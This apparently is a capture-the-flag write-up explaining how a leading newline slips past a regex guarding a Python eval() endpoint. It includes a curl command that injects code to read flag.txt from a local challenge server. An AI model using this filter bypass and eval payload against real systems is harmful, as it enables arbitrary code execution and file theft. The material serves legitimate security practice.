### Code analysis
we see this line here where `user_code` is supplied by the user to an eval function that will execute python code:
`result = eval(user_code)`

but before that there is a strict regex that will stop us from entering any characters in `user_code`:
```python
if re.match(".*[\x20-\x7E]+.*", user_code):
	return jsonify({"output": "PEW PEW you can't use chars"}), 403
```

## Solution
`re.math` if used against multiple lines it will check only the first line so the solution is to simply enter an empty new line and then in the second write our payload

* run the following curl command : 
```bash
curl -X "POST" http://127.0.0.1:1337/pew -d "pew=
open('flag.txt').read()"
```


